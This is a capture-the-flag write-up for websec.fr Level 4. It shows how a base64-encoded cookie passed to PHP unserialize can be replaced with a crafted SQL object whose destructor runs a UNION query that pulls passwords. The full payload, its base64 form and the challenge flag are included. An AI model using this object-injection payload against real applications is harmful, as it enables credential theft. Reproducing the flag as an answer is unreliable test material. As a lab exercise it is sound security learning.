# Level 4

1. First, lets check out what is written in http://websec.fr/level04/source1.php and http://websec.fr/level04/source2.php
2. Then, we could find out that there is a decode of cookie 
```
$sess_data = unserialize (base64_decode ($_COOKIE['leet_hax0r']));
```
3. I decode it by base64 and get the value of it. It could be different!
```
a:1:{s:2:"ip";s:13:"111.71.64.183";}
```
4. Next, we have to know what does "a" "s" and the number behind them means, so lets look up the website and you will easily know. https://www.evonide.com/fuzzing-unserialize
    After we know what they mean, we have to figure out a payload that can get the flag. Lets look up the function below : 
    ```
    public function __destruct() {
            if (!isset ($this->conn)) {
                $this->connect ();
            }

            $ret = $this->execute ();
            if (false !== $ret) {    
                while (false !== ($row = $ret->fetchArray (SQLITE3_ASSOC))) {
                    echo '<p class="well"><strong>Username:<strong> ' . $row['username'] . '</p>';
                }
            }
        }
    ```
5. Read in the function and we would find out that this function will be run when object is destroyed! So if we create SQL object and supply custom query, we are able to sql injection ~~~ 
    ```
    payload : O:3:"SQL":1:{s:5:"query";s:81:"select username from users where id=1 union select password from users where id=1";}
    base64 : TzozOiJTUUwiOjE6e3M6NToicXVlcnkiO3M6ODE6InNlbGVjdCB1c2VybmFtZSBmcm9tIHVzZXJzIHdoZXJlIGlkPTEgdW5pb24gc2VsZWN0IHBhc3N3b3JkIGZyb20gdXNlcnMgd2hlcmUgaWQ9MSI7fQ==
    ```
    "O" means "object" named "SQL" and "s" means "string" 
6. Here is the flag : WEBSEC{9abd8e8247cbe62641ff662e8fbb662769c08500}
